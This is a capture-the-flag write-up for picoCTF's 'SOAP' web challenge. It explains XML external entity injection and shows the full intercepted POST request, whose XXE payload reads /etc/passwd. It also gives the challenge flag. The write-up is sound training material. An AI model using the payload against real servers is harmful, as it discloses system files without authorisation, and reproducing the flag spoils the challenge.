##Challenge: SOAP

##Category: Web Exploitation

##Description: The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

###Hints:

#####1. XML external entity Injection

The hint gives away the whole gist of the exploit of the challenge: XXE, which is an XML eXternal Entity injection. The idea behind the exploit is that given that a website accepts XML data, it is susceptible to data infiltration, server-side request forgery (SSRF), and many more vulnerabilities. This is because a website user can supply entities, which are essentially variables in the XML language that can reference internal or external data typed out by the user. The way I went about solving the challenge was by first using Burp Suite to intercept the request made when I clicked on the Details buttons on the website. Each time one of the buttons is sent, the website generates XML data for the web server to interpret, creating a "<data>" field in a POST request to the /data directory of the website. Proof that the web server uses XML can also be seen in the xmlDetailsCheckPayload.js file, as it generates the XML code. Going into the intercepted request, I modified the XML form to get /etc/passwd to be leaked by an external entity, displaying the flag along with it:

>POST /data HTTP/1.1
>Host: saturn.picoctf.net:60367
>Content-Length: 61
>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
>Content-Type: application/xml
>Accept: */*
>Origin: http://saturn.picoctf.net:60367
>Referer: http://saturn.picoctf.net:60367/
>Accept-Encoding: gzip, deflate
>Accept-Language: en-US,en;q=0.9
>Connection: close

><?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>

###Reference: [1](https://portswigger.net/web-security/xxe)

###Flag: picoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}

Solved by giggsterpuku
